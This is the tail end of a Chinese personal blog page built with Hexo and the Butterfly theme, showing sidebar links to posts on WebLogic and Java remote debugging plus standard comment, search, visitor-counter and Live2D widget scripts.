class="aside-list-item"><a class="thumbnail" href="/2025/02/27/WebLogic%E5%AD%A6%E4%B9%A0/" title="WebLogic学习"><img src="http://cdn.clown2024.cn/202407151814121.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="WebLogic学习"/></a><div class="content"><a class="title" href="/2025/02/27/WebLogic%E5%AD%A6%E4%B9%A0/" title="WebLogic学习">WebLogic学习</a><time datetime="2025-02-27T11:22:37.000Z" title="发表于 2025-02-27 19:22:37">2025-02-27</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/02/07/Java%E8%BF%9C%E7%A8%8B%E8%B0%83%E8%AF%95/" title="Java远程调试"><img src="http://cdn.clown2024.cn/202407151814121.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Java远程调试"/></a><div class="content"><a class="title" href="/2025/02/07/Java%E8%BF%9C%E7%A8%8B%E8%B0%83%E8%AF%95/" title="Java远程调试">Java远程调试</a><time datetime="2025-02-07T15:11:43.000Z" title="发表于 2025-02-07 23:11:43">2025-02-07</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2025 By clown</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.13.0"></script><script src="/js/main.js?v=4.13.0"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"><script>(() => {
+  const getCount = () => {
+    const countELement = document.getElementById('twikoo-count')
+    if(!countELement) return
+    twikoo.getCommentsCount({
+      envId: 'https://clown-vercel.vercel.app',
+      region: '',
+      urls: [window.location.pathname],
+      includeReply: false
+    }).then(res => {
+      countELement.textContent = res[0].count
+    }).catch(err => {
+      console.error(err)
+    })
+  }
+
+  const init = () => {
+    twikoo.init(Object.assign({
+      el: '#twikoo-wrap',
+      envId: 'https://clown-vercel.vercel.app',
+      region: '',
+      onCommentLoaded: () => {
+        btf.loadLightbox(document.querySelectorAll('#twikoo .tk-content img:not(.tk-owo-emotion)'))
+      }
+    }, null))
+
+    GLOBAL_CONFIG_SITE.isPost && getCount()
+  }
+
+  const loadTwikoo = () => {
+    if (typeof twikoo === 'object') setTimeout(init,0)
+    else getScript('https://cdn.jsdelivr.net/npm/twikoo@1.6.31/dist/twikoo.all.min.js').then(init)
+  }
+
+  if ('Twikoo' === 'Twikoo' || !false) {
+    if (false) btf.loadComment(document.getElementById('twikoo-wrap'), loadTwikoo)
+    else loadTwikoo()
+  } else {
+    window.loadOtherComment = loadTwikoo
+  }
+})()</script></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=4.13.0"></script></div></div><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/shizuku.model.json"},"display":{"position":"left","width":150,"height":300},"mobile":{"show":true},"react":{"opacity":0.7},"log":false});</script></body></html>
